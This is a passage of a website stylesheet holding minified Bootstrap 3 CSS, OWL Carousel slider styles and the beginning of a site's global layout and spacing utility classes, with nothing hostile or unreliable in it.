rgba(0,0,0,.05)}.panel-body{padding:15px}.panel-heading{padding:10px 15px;border-bottom:1px solid transparent;border-top-left-radius:3px;border-top-right-radius:3px}.panel-heading>.dropdown .dropdown-toggle{color:inherit}.panel-title{margin-top:0;margin-bottom:0;font-size:16px;color:inherit}.panel-title>a{color:inherit}.panel-footer{padding:10px 15px;background-color:#f5f5f5;border-top:1px solid #ddd;border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel>.list-group,.panel>.panel-collapse>.list-group{margin-bottom:0}.panel>.list-group .list-group-item,.panel>.panel-collapse>.list-group .list-group-item{border-width:1px 0;border-radius:0}.panel>.list-group:first-child .list-group-item:first-child,.panel>.panel-collapse>.list-group:first-child .list-group-item:first-child{border-top:0;border-top-left-radius:3px;border-top-right-radius:3px}.panel>.list-group:last-child .list-group-item:last-child,.panel>.panel-collapse>.list-group:last-child .list-group-item:last-child{border-bottom:0;border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel-heading+.list-group .list-group-item:first-child{border-top-width:0}.list-group+.panel-footer{border-top-width:0}.panel>.panel-collapse>.table,.panel>.table,.panel>.table-responsive>.table{margin-bottom:0}.panel>.panel-collapse>.table caption,.panel>.table caption,.panel>.table-responsive>.table caption{padding-right:15px;padding-left:15px}.panel>.table-responsive:first-child>.table:first-child,.panel>.table:first-child{border-top-left-radius:3px;border-top-right-radius:3px}.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child,.panel>.table:first-child>thead:first-child>tr:first-child{border-top-left-radius:3px;border-top-right-radius:3px}.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:first-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child td:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child th:first-child,.panel>.table:first-child>thead:first-child>tr:first-child td:first-child,.panel>.table:first-child>thead:first-child>tr:first-child th:first-child{border-top-left-radius:3px}.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:last-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:last-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:last-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:last-child,.panel>.table:first-child>tbody:first-child>tr:first-child td:last-child,.panel>.table:first-child>tbody:first-child>tr:first-child th:last-child,.panel>.table:first-child>thead:first-child>tr:first-child td:last-child,.panel>.table:first-child>thead:first-child>tr:first-child th:last-child{border-top-right-radius:3px}.panel>.table-responsive:last-child>.table:last-child,.panel>.table:last-child{border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child,.panel>.table:last-child>tbody:last-child>tr:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child{border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:first-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:first-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:first-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:first-child,.panel>.table:last-child>tbody:last-child>tr:last-child td:first-child,.panel>.table:last-child>tbody:last-child>tr:last-child th:first-child,.panel>.table:last-child>tfoot:last-child>tr:last-child td:first-child,.panel>.table:last-child>tfoot:last-child>tr:last-child th:first-child{border-bottom-left-radius:3px}.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:last-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:last-child,.panel>.table:last-child>tbody:last-child>tr:last-child td:last-child,.panel>.table:last-child>tbody:last-child>tr:last-child th:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child td:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child th:last-child{border-bottom-right-radius:3px}.panel>.panel-body+.table,.panel>.panel-body+.table-responsive,.panel>.table+.panel-body,.panel>.table-responsive+.panel-body{border-top:1px solid #ddd}.panel>.table>tbody:first-child>tr:first-child td,.panel>.table>tbody:first-child>tr:first-child th{border-top:0}.panel>.table-bordered,.panel>.table-responsive>.table-bordered{border:0}.panel>.table-bordered>tbody>tr>td:first-child,.panel>.table-bordered>tbody>tr>th:first-child,.panel>.table-bordered>tfoot>tr>td:first-child,.panel>.table-bordered>tfoot>tr>th:first-child,.panel>.table-bordered>thead>tr>td:first-child,.panel>.table-bordered>thead>tr>th:first-child,.panel>.table-responsive>.table-bordered>tbody>tr>td:first-child,.panel>.table-responsive>.table-bordered>tbody>tr>th:first-child,.panel>.table-responsive>.table-bordered>tfoot>tr>td:first-child,.panel>.table-responsive>.table-bordered>tfoot>tr>th:first-child,.panel>.table-responsive>.table-bordered>thead>tr>td:first-child,.panel>.table-responsive>.table-bordered>thead>tr>th:first-child{border-left:0}.panel>.table-bordered>tbody>tr>td:last-child,.panel>.table-bordered>tbody>tr>th:last-child,.panel>.table-bordered>tfoot>tr>td:last-child,.panel>.table-bordered>tfoot>tr>th:last-child,.panel>.table-bordered>thead>tr>td:last-child,.panel>.table-bordered>thead>tr>th:last-child,.panel>.table-responsive>.table-bordered>tbody>tr>td:last-child,.panel>.table-responsive>.table-bordered>tbody>tr>th:last-child,.panel>.table-responsive>.table-bordered>tfoot>tr>td:last-child,.panel>.table-responsive>.table-bordered>tfoot>tr>th:last-child,.panel>.table-responsive>.table-bordered>thead>tr>td:last-child,.panel>.table-responsive>.table-bordered>thead>tr>th:last-child{border-right:0}.panel>.table-bordered>tbody>tr:first-child>td,.panel>.table-bordered>tbody>tr:first-child>th,.panel>.table-bordered>thead>tr:first-child>td,.panel>.table-bordered>thead>tr:first-child>th,.panel>.table-responsive>.table-bordered>tbody>tr:first-child>td,.panel>.table-responsive>.table-bordered>tbody>tr:first-child>th,.panel>.table-responsive>.table-bordered>thead>tr:first-child>td,.panel>.table-responsive>.table-bordered>thead>tr:first-child>th{border-bottom:0}.panel>.table-bordered>tbody>tr:last-child>td,.panel>.table-bordered>tbody>tr:last-child>th,.panel>.table-bordered>tfoot>tr:last-child>td,.panel>.table-bordered>tfoot>tr:last-child>th,.panel>.table-responsive>.table-bordered>tbody>tr:last-child>td,.panel>.table-responsive>.table-bordered>tbody>tr:last-child>th,.panel>.table-responsive>.table-bordered>tfoot>tr:last-child>td,.panel>.table-responsive>.table-bordered>tfoot>tr:last-child>th{border-bottom:0}.panel>.table-responsive{margin-bottom:0;border:0}.panel-group{margin-bottom:20px}.panel-group .panel{margin-bottom:0;border-radius:4px}.panel-group .panel+.panel{margin-top:5px}.panel-group .panel-heading{border-bottom:0}.panel-group .panel-heading+.panel-collapse>.list-group,.panel-group .panel-heading+.panel-collapse>.panel-body{border-top:1px solid #ddd}.panel-group .panel-footer{border-top:0}.panel-group .panel-footer+.panel-collapse .panel-body{border-bottom:1px solid #ddd}.panel-default{border-color:#ddd}.panel-default>.panel-heading{color:#333;background-color:#f5f5f5;border-color:#ddd}.panel-default>.panel-heading+.panel-collapse>.panel-body{border-top-color:#ddd}.panel-default>.panel-heading .badge{color:#f5f5f5;background-color:#333}.panel-default>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#ddd}.panel-primary{border-color:#337ab7}.panel-primary>.panel-heading{color:#fff;background-color:#337ab7;border-color:#337ab7}.panel-primary>.panel-heading+.panel-collapse>.panel-body{border-top-color:#337ab7}.panel-primary>.panel-heading .badge{color:#337ab7;background-color:#fff}.panel-primary>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#337ab7}.panel-success{border-color:#d6e9c6}.panel-success>.panel-heading{color:#3c763d;background-color:#dff0d8;border-color:#d6e9c6}.panel-success>.panel-heading+.panel-collapse>.panel-body{border-top-color:#d6e9c6}.panel-success>.panel-heading .badge{color:#dff0d8;background-color:#3c763d}.panel-success>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#d6e9c6}.panel-info{border-color:#bce8f1}.panel-info>.panel-heading{color:#31708f;background-color:#d9edf7;border-color:#bce8f1}.panel-info>.panel-heading+.panel-collapse>.panel-body{border-top-color:#bce8f1}.panel-info>.panel-heading .badge{color:#d9edf7;background-color:#31708f}.panel-info>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#bce8f1}.panel-warning{border-color:#faebcc}.panel-warning>.panel-heading{color:#8a6d3b;background-color:#fcf8e3;border-color:#faebcc}.panel-warning>.panel-heading+.panel-collapse>.panel-body{border-top-color:#faebcc}.panel-warning>.panel-heading .badge{color:#fcf8e3;background-color:#8a6d3b}.panel-warning>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#faebcc}.panel-danger{border-color:#ebccd1}.panel-danger>.panel-heading{color:#a94442;background-color:#f2dede;border-color:#ebccd1}.panel-danger>.panel-heading+.panel-collapse>.panel-body{border-top-color:#ebccd1}.panel-danger>.panel-heading .badge{color:#f2dede;background-color:#a94442}.panel-danger>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#ebccd1}.embed-responsive{position:relative;display:block;height:0;padding:0;overflow:hidden}.embed-responsive .embed-responsive-item,.embed-responsive embed,.embed-responsive iframe,.embed-responsive object,.embed-responsive video{position:absolute;top:0;bottom:0;left:0;width:100%;height:100%;border:0}.embed-responsive.embed-responsive-16by9{padding-bottom:56.25%}.embed-responsive.embed-responsive-4by3{padding-bottom:75%}.well{min-height:20px;padding:19px;margin-bottom:20px;background-color:#f5f5f5;border:1px solid #e3e3e3;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.05);box-shadow:inset 0 1px 1px rgba(0,0,0,.05)}.well blockquote{border-color:#ddd;border-color:rgba(0,0,0,.15)}.well-lg{padding:24px;border-radius:6px}.well-sm{padding:9px;border-radius:3px}.close{float:right;font-size:21px;font-weight:700;line-height:1;color:#000;text-shadow:0 1px 0 #fff;filter:alpha(opacity=20);opacity:.2}.close:focus,.close:hover{color:#000;text-decoration:none;cursor:pointer;filter:alpha(opacity=50);opacity:.5}button.close{-webkit-appearance:none;padding:0;cursor:pointer;background:0 0;border:0}.modal-open{overflow:hidden}.modal{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1040;display:none;overflow:hidden;-webkit-overflow-scrolling:touch;outline:0}.modal.fade .modal-dialog{-webkit-transition:-webkit-transform .3s ease-out;-o-transition:-o-transform .3s ease-out;transition:transform .3s ease-out;-webkit-transform:translate(0,-25%);-ms-transform:translate(0,-25%);-o-transform:translate(0,-25%);transform:translate(0,-25%)}.modal.in .modal-dialog{-webkit-transform:translate(0,0);-ms-transform:translate(0,0);-o-transform:translate(0,0);transform:translate(0,0)}.modal-open .modal{overflow-x:hidden;overflow-y:auto}.modal-dialog{position:relative;width:auto;margin:10px}.modal-content{position:relative;background-color:#fff;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid #999;border:1px solid rgba(0,0,0,.2);border-radius:6px;outline:0;-webkit-box-shadow:0 3px 9px rgba(0,0,0,.5);box-shadow:0 3px 9px rgba(0,0,0,.5)}.modal-backdrop{position:absolute;top:0;right:0;left:0;background-color:#000}.modal-backdrop.fade{filter:alpha(opacity=0);opacity:0}.modal-backdrop.in{filter:alpha(opacity=50);opacity:.5}.modal-header{min-height:16.43px;padding:15px;border-bottom:1px solid #e5e5e5}.modal-header .close{margin-top:-2px}.modal-title{margin:0;line-height:1.42857143}.modal-body{position:relative;padding:15px}.modal-footer{padding:15px;text-align:right;border-top:1px solid #e5e5e5}.modal-footer .btn+.btn{margin-bottom:0;margin-left:5px}.modal-footer .btn-group .btn+.btn{margin-left:-1px}.modal-footer .btn-block+.btn-block{margin-left:0}.modal-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}@media (min-width:768px){.modal-dialog{width:600px;margin:30px auto}.modal-content{-webkit-box-shadow:0 5px 15px rgba(0,0,0,.5);box-shadow:0 5px 15px rgba(0,0,0,.5)}.modal-sm{width:300px}}@media (min-width:992px){.modal-lg{width:900px}}.tooltip{position:absolute;z-index:1070;display:block;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:12px;font-weight:400;line-height:1.4;visibility:visible;filter:alpha(opacity=0);opacity:0}.tooltip.in{filter:alpha(opacity=90);opacity:.9}.tooltip.top{padding:5px 0;margin-top:-3px}.tooltip.right{padding:0 5px;margin-left:3px}.tooltip.bottom{padding:5px 0;margin-top:3px}.tooltip.left{padding:0 5px;margin-left:-3px}.tooltip-inner{max-width:200px;padding:3px 8px;color:#fff;text-align:center;text-decoration:none;background-color:#000;border-radius:4px}.tooltip-arrow{position:absolute;width:0;height:0;border-color:transparent;border-style:solid}.tooltip.top .tooltip-arrow{bottom:0;left:50%;margin-left:-5px;border-width:5px 5px 0;border-top-color:#000}.tooltip.top-left .tooltip-arrow{right:5px;bottom:0;margin-bottom:-5px;border-width:5px 5px 0;border-top-color:#000}.tooltip.top-right .tooltip-arrow{bottom:0;left:5px;margin-bottom:-5px;border-width:5px 5px 0;border-top-color:#000}.tooltip.right .tooltip-arrow{top:50%;left:0;margin-top:-5px;border-width:5px 5px 5px 0;border-right-color:#000}.tooltip.left .tooltip-arrow{top:50%;right:0;margin-top:-5px;border-width:5px 0 5px 5px;border-left-color:#000}.tooltip.bottom .tooltip-arrow{top:0;left:50%;margin-left:-5px;border-width:0 5px 5px;border-bottom-color:#000}.tooltip.bottom-left .tooltip-arrow{top:0;right:5px;margin-top:-5px;border-width:0 5px 5px;border-bottom-color:#000}.tooltip.bottom-right .tooltip-arrow{top:0;left:5px;margin-top:-5px;border-width:0 5px 5px;border-bottom-color:#000}.popover{position:absolute;top:0;left:0;z-index:1060;display:none;max-width:276px;padding:1px;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;font-weight:400;line-height:1.42857143;text-align:left;white-space:normal;background-color:#fff;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid #ccc;border:1px solid rgba(0,0,0,.2);border-radius:6px;-webkit-box-shadow:0 5px 10px rgba(0,0,0,.2);box-shadow:0 5px 10px rgba(0,0,0,.2)}.popover.top{margin-top:-10px}.popover.right{margin-left:10px}.popover.bottom{margin-top:10px}.popover.left{margin-left:-10px}.popover-title{padding:8px 14px;margin:0;font-size:14px;background-color:#f7f7f7;border-bottom:1px solid #ebebeb;border-radius:5px 5px 0 0}.popover-content{padding:9px 14px}.popover>.arrow,.popover>.arrow:after{position:absolute;display:block;width:0;height:0;border-color:transparent;border-style:solid}.popover>.arrow{border-width:11px}.popover>.arrow:after{content:"";border-width:10px}.popover.top>.arrow{bottom:-11px;left:50%;margin-left:-11px;border-top-color:#999;border-top-color:rgba(0,0,0,.25);border-bottom-width:0}.popover.top>.arrow:after{bottom:1px;margin-left:-10px;content:" ";border-top-color:#fff;border-bottom-width:0}.popover.right>.arrow{top:50%;left:-11px;margin-top:-11px;border-right-color:#999;border-right-color:rgba(0,0,0,.25);border-left-width:0}.popover.right>.arrow:after{bottom:-10px;left:1px;content:" ";border-right-color:#fff;border-left-width:0}.popover.bottom>.arrow{top:-11px;left:50%;margin-left:-11px;border-top-width:0;border-bottom-color:#999;border-bottom-color:rgba(0,0,0,.25)}.popover.bottom>.arrow:after{top:1px;margin-left:-10px;content:" ";border-top-width:0;border-bottom-color:#fff}.popover.left>.arrow{top:50%;right:-11px;margin-top:-11px;border-right-width:0;border-left-color:#999;border-left-color:rgba(0,0,0,.25)}.popover.left>.arrow:after{right:1px;bottom:-10px;content:" ";border-right-width:0;border-left-color:#fff}.carousel{position:relative}.carousel-inner{position:relative;width:100%;overflow:hidden}.carousel-inner>.item{position:relative;display:none;-webkit-transition:.6s ease-in-out left;-o-transition:.6s ease-in-out left;transition:.6s ease-in-out left}.carousel-inner>.item>a>img,.carousel-inner>.item>img{line-height:1}@media all and (transform-3d),(-webkit-transform-3d){.carousel-inner>.item{-webkit-transition:-webkit-transform .6s ease-in-out;-o-transition:-o-transform .6s ease-in-out;transition:transform .6s ease-in-out;-webkit-backface-visibility:hidden;backface-visibility:hidden;-webkit-perspective:1000;perspective:1000}.carousel-inner>.item.active.right,.carousel-inner>.item.next{left:0;-webkit-transform:translate3d(100%,0,0);transform:translate3d(100%,0,0)}.carousel-inner>.item.active.left,.carousel-inner>.item.prev{left:0;-webkit-transform:translate3d(-100%,0,0);transform:translate3d(-100%,0,0)}.carousel-inner>.item.active,.carousel-inner>.item.next.left,.carousel-inner>.item.prev.right{left:0;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}}.carousel-inner>.active,.carousel-inner>.next,.carousel-inner>.prev{display:block}.carousel-inner>.active{left:0}.carousel-inner>.next,.carousel-inner>.prev{position:absolute;top:0;width:100%}.carousel-inner>.next{left:100%}.carousel-inner>.prev{left:-100%}.carousel-inner>.next.left,.carousel-inner>.prev.right{left:0}.carousel-inner>.active.left{left:-100%}.carousel-inner>.active.right{left:100%}.carousel-control{position:absolute;top:0;bottom:0;left:0;width:15%;font-size:20px;color:#fff;text-align:center;text-shadow:0 1px 2px rgba(0,0,0,.6);filter:alpha(opacity=50);opacity:.5}.carousel-control.left{background-image:-webkit-linear-gradient(left,rgba(0,0,0,.5) 0,rgba(0,0,0,.0001) 100%);background-image:-o-linear-gradient(left,rgba(0,0,0,.5) 0,rgba(0,0,0,.0001) 100%);background-image:-webkit-gradient(linear,left top,right top,from(rgba(0,0,0,.5)),to(rgba(0,0,0,.0001)));background-image:linear-gradient(to right,rgba(0,0,0,.5) 0,rgba(0,0,0,.0001) 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000', endColorstr='#00000000', GradientType=1);background-repeat:repeat-x}.carousel-control.right{right:0;left:auto;background-image:-webkit-linear-gradient(left,rgba(0,0,0,.0001) 0,rgba(0,0,0,.5) 100%);background-image:-o-linear-gradient(left,rgba(0,0,0,.0001) 0,rgba(0,0,0,.5) 100%);background-image:-webkit-gradient(linear,left top,right top,from(rgba(0,0,0,.0001)),to(rgba(0,0,0,.5)));background-image:linear-gradient(to right,rgba(0,0,0,.0001) 0,rgba(0,0,0,.5) 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#80000000', GradientType=1);background-repeat:repeat-x}.carousel-control:focus,.carousel-control:hover{color:#fff;text-decoration:none;filter:alpha(opacity=90);outline:0;opacity:.9}.carousel-control .glyphicon-chevron-left,.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next,.carousel-control .icon-prev{position:absolute;top:50%;z-index:5;display:inline-block}.carousel-control .glyphicon-chevron-left,.carousel-control .icon-prev{left:50%;margin-left:-10px}.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next{right:50%;margin-right:-10px}.carousel-control .icon-next,.carousel-control .icon-prev{width:20px;height:20px;margin-top:-10px;font-family:serif}.carousel-control .icon-prev:before{content:'\2039'}.carousel-control .icon-next:before{content:'\203a'}.carousel-indicators{position:absolute;bottom:10px;left:50%;z-index:15;width:60%;padding-left:0;margin-left:-30%;text-align:center;list-style:none}.carousel-indicators li{display:inline-block;width:10px;height:10px;margin:1px;text-indent:-999px;cursor:pointer;background-color:#000\9;background-color:rgba(0,0,0,0);border:1px solid #fff;border-radius:10px}.carousel-indicators .active{width:12px;height:12px;margin:0;background-color:#fff}.carousel-caption{position:absolute;right:15%;bottom:20px;left:15%;z-index:10;padding-top:20px;padding-bottom:20px;color:#fff;text-align:center;text-shadow:0 1px 2px rgba(0,0,0,.6)}.carousel-caption .btn{text-shadow:none}@media screen and (min-width:768px){.carousel-control .glyphicon-chevron-left,.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next,.carousel-control .icon-prev{width:30px;height:30px;margin-top:-15px;font-size:30px}.carousel-control .glyphicon-chevron-left,.carousel-control .icon-prev{margin-left:-15px}.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next{margin-right:-15px}.carousel-caption{right:20%;left:20%;padding-bottom:30px}.carousel-indicators{bottom:20px}}.btn-group-vertical>.btn-group:after,.btn-group-vertical>.btn-group:before,.btn-toolbar:after,.btn-toolbar:before,.clearfix:after,.clearfix:before,.container-fluid:after,.container-fluid:before,.container:after,.container:before,.dl-horizontal dd:after,.dl-horizontal dd:before,.form-horizontal .form-group:after,.form-horizontal .form-group:before,.modal-footer:after,.modal-footer:before,.nav:after,.nav:before,.navbar-collapse:after,.navbar-collapse:before,.navbar-header:after,.navbar-header:before,.navbar:after,.navbar:before,.pager:after,.pager:before,.panel-body:after,.panel-body:before,.row:after,.row:before{display:table;content:" "}.btn-group-vertical>.btn-group:after,.btn-toolbar:after,.clearfix:after,.container-fluid:after,.container:after,.dl-horizontal dd:after,.form-horizontal .form-group:after,.modal-footer:after,.nav:after,.navbar-collapse:after,.navbar-header:after,.navbar:after,.pager:after,.panel-body:after,.row:after{clear:both}.center-block{display:block;margin-right:auto;margin-left:auto}.pull-right{float:right!important}.pull-left{float:left!important}.hide{display:none!important}.show{display:block!important}.invisible{visibility:hidden}.text-hide{font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0}.hidden{display:none!important;visibility:hidden!important}.affix{position:fixed}@-ms-viewport{width:device-width}.visible-lg,.visible-md,.visible-sm,.visible-xs{display:none!important}.visible-lg-block,.visible-lg-inline,.visible-lg-inline-block,.visible-md-block,.visible-md-inline,.visible-md-inline-block,.visible-sm-block,.visible-sm-inline,.visible-sm-inline-block,.visible-xs-block,.visible-xs-inline,.visible-xs-inline-block{display:none!important}@media (max-width:767px){.visible-xs{display:block!important}table.visible-xs{display:table}tr.visible-xs{display:table-row!important}td.visible-xs,th.visible-xs{display:table-cell!important}}@media (max-width:767px){.visible-xs-block{display:block!important}}@media (max-width:767px){.visible-xs-inline{display:inline!important}}@media (max-width:767px){.visible-xs-inline-block{display:inline-block!important}}@media (min-width:768px) and (max-width:991px){.visible-sm{display:block!important}table.visible-sm{display:table}tr.visible-sm{display:table-row!important}td.visible-sm,th.visible-sm{display:table-cell!important}}@media (min-width:768px) and (max-width:991px){.visible-sm-block{display:block!important}}@media (min-width:768px) and (max-width:991px){.visible-sm-inline{display:inline!important}}@media (min-width:768px) and (max-width:991px){.visible-sm-inline-block{display:inline-block!important}}@media (min-width:992px) and (max-width:1199px){.visible-md{display:block!important}table.visible-md{display:table}tr.visible-md{display:table-row!important}td.visible-md,th.visible-md{display:table-cell!important}}@media (min-width:992px) and (max-width:1199px){.visible-md-block{display:block!important}}@media (min-width:992px) and (max-width:1199px){.visible-md-inline{display:inline!important}}@media (min-width:992px) and (max-width:1199px){.visible-md-inline-block{display:inline-block!important}}@media (min-width:1200px){.visible-lg{display:block!important}table.visible-lg{display:table}tr.visible-lg{display:table-row!important}td.visible-lg,th.visible-lg{display:table-cell!important}}@media (min-width:1200px){.visible-lg-block{display:block!important}}@media (min-width:1200px){.visible-lg-inline{display:inline!important}}@media (min-width:1200px){.visible-lg-inline-block{display:inline-block!important}}@media (max-width:767px){.hidden-xs{display:none!important}}@media (min-width:768px) and (max-width:991px){.hidden-sm{display:none!important}}@media (min-width:992px) and (max-width:1199px){.hidden-md{display:none!important}}@media (min-width:1200px){.hidden-lg{display:none!important}}.visible-print{display:none!important}@media print{.visible-print{display:block!important}table.visible-print{display:table}tr.visible-print{display:table-row!important}td.visible-print,th.visible-print{display:table-cell!important}}.visible-print-block{display:none!important}@media print{.visible-print-block{display:block!important}}.visible-print-inline{display:none!important}@media print{.visible-print-inline{display:inline!important}}.visible-print-inline-block{display:none!important}@media print{.visible-print-inline-block{display:inline-block!important}}@media print{.hidden-print{display:none!important}}
/*# sourceMappingURL=bootstrap.min.css.map */
/*-------------------------------------------*/
/*  2. OWL.Carousel(Slider)
/*-------------------------------------------*/
.owl-carousel,.owl-carousel .owl-item{-webkit-tap-highlight-color:transparent;position:relative}.owl-carousel{display:none;width:100%;z-index:1}.owl-carousel .owl-stage{position:relative;-ms-touch-action:pan-Y}.owl-carousel .owl-stage:after{content:".";display:block;clear:both;visibility:hidden;line-height:0;height:0}.owl-carousel .owl-stage-outer{position:relative;overflow:hidden;-webkit-transform:translate3d(0,0,0)}.owl-carousel .owl-item,.owl-carousel .owl-wrapper{-webkit-backface-visibility:hidden;-moz-backface-visibility:hidden;-ms-backface-visibility:hidden;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0)}.owl-carousel .owl-item{min-height:1px;float:left;-webkit-backface-visibility:hidden;-webkit-touch-callout:none}.owl-carousel .owl-item img{display:block;width:100%}.owl-carousel .owl-dots.disabled,.owl-carousel .owl-nav.disabled{display:none}.no-js .owl-carousel,.owl-carousel.owl-loaded{display:block}.owl-carousel .owl-dot,.owl-carousel .owl-nav .owl-next,.owl-carousel .owl-nav .owl-prev{cursor:pointer;cursor:hand;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.owl-carousel.owl-loading{opacity:0;display:block}.owl-carousel.owl-hidden{opacity:0}.owl-carousel.owl-refresh .owl-item{visibility:hidden}.owl-carousel.owl-drag .owl-item{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.owl-carousel.owl-grab{cursor:move;cursor:grab}.owl-carousel.owl-rtl{direction:rtl}.owl-carousel.owl-rtl .owl-item{float:right}.owl-carousel .animated{-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-fill-mode:both;animation-fill-mode:both}.owl-carousel .owl-animated-in{z-index:0}.owl-carousel .owl-animated-out{z-index:1}.owl-carousel .fadeOut{-webkit-animation-name:fadeOut;animation-name:fadeOut}@-webkit-keyframes fadeOut{0%{opacity:1}100%{opacity:0}}@keyframes fadeOut{0%{opacity:1}100%{opacity:0}}.owl-height{transition:height .5s ease-in-out}.owl-carousel .owl-item .owl-lazy{opacity:0;transition:opacity .4s ease}.owl-carousel .owl-item img.owl-lazy{-webkit-transform-style:preserve-3d;transform-style:preserve-3d}.owl-carousel .owl-video-wrapper{position:relative;height:100%;background:#000}.owl-carousel .owl-video-play-icon{position:absolute;height:80px;width:80px;left:50%;top:50%;margin-left:-40px;margin-top:-40px;background:url(owl.video.play.png) no-repeat;cursor:pointer;z-index:1;-webkit-backface-visibility:hidden;transition:-webkit-transform .1s ease;transition:transform .1s ease}.owl-carousel .owl-video-play-icon:hover{-webkit-transform:scale(1.3,1.3);-ms-transform:scale(1.3,1.3);transform:scale(1.3,1.3)}.owl-carousel .owl-video-playing .owl-video-play-icon,.owl-carousel .owl-video-playing .owl-video-tn{display:none}.owl-carousel .owl-video-tn{opacity:0;height:100%;background-position:center center;background-repeat:no-repeat;background-size:contain;transition:opacity .4s ease}.owl-carousel .owl-video-frame{position:relative;z-index:1;height:100%;width:100%}.owl-theme .owl-dots,.owl-theme .owl-nav{text-align:center;-webkit-tap-highlight-color:transparent}.owl-theme .owl-nav{margin-top:10px}.owl-theme .owl-nav [class*=owl-]{color:#FFF;font-size:14px;margin:5px;padding:4px 7px;background:#D6D6D6;display:inline-block;cursor:pointer;border-radius:3px}.owl-theme .owl-nav [class*=owl-]:hover{background:#869791;color:#FFF;text-decoration:none}.owl-theme .owl-nav .disabled{opacity:.5;cursor:default}.owl-theme .owl-nav.disabled+.owl-dots{margin-top:10px}.owl-theme .owl-dots .owl-dot{display:inline-block;zoom:1}.owl-theme .owl-dots .owl-dot span{width:10px;height:10px;margin:5px 7px;background:#D6D6D6;display:block;-webkit-backface-visibility:visible;transition:opacity .2s ease;border-radius:30px}.owl-theme .owl-dots .owl-dot.active span,.owl-theme .owl-dots .owl-dot:hover span{background:#869791}

/*-------------------------------------------*/
/*  3. Global CSS
/*-------------------------------------------*/
*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;padding:0;margin:0;text-decoration:none!important;list-style:none!important;outline:0!important}
body{font-weight:400;overflow-x:hidden}
img{width:100%;height:auto}
h1,h2,h3{font-weight:700}
h1{font-size:70px}
h2{font-size:50px}
h3{font-size:35px}
h4{font-size:30px}
h5{font-size:25px}
h6{font-size:18px}
p{line-height:1.8;margin:0;font-size:16px}
span{display:inline-block}
.v-middle{position:absolute;width:100%;top:50%;left:0;-webkit-transform:translate(0,-50%);-moz-transform:translate(0,-50%);-ms-transform:translate(0,-50%);-o-transform:translate(0,-50%);transform:translate(0,-50%)}
.clear-fix{clear:both}
.mt-10{margin-top:10px}
.mt-20{margin-top:20px}
.mt-40{margin-top:40px}
.mt-60{margin-top:60px}
.mt-80{margin-top:80px}
.mt-100{margin-top:100px}
.mb-10{margin-bottom:10px}
.mb-20{margin-bottom:20px}
.mb-30{margin-bottom:30px}
.mb-50{margin-bottom:50px}
.mb-80{margin-bottom:80px}
.mrl-10{margin:0 10px}
.mrl-20{margin:0 20px}
.mrl-30{margin:0 30px}
.mrl-40{margin:0 40px}
.mrl-50{margin:0 50px}
.no-padding{padding:0!important}
.pb-10{padding-bottom:10px}
.pb-20{padding-bottom:20px}
.pb-30{padding-bottom:30px}
.pb-50{padding-bottom:50px}
.pb-80{padding-bottom:80px}
.pb-100{padding-bottom:100px}
.pt-10{padding-top:10px}
.pt-20{padding-top:20px}
.pt-30{padding-top:30px}
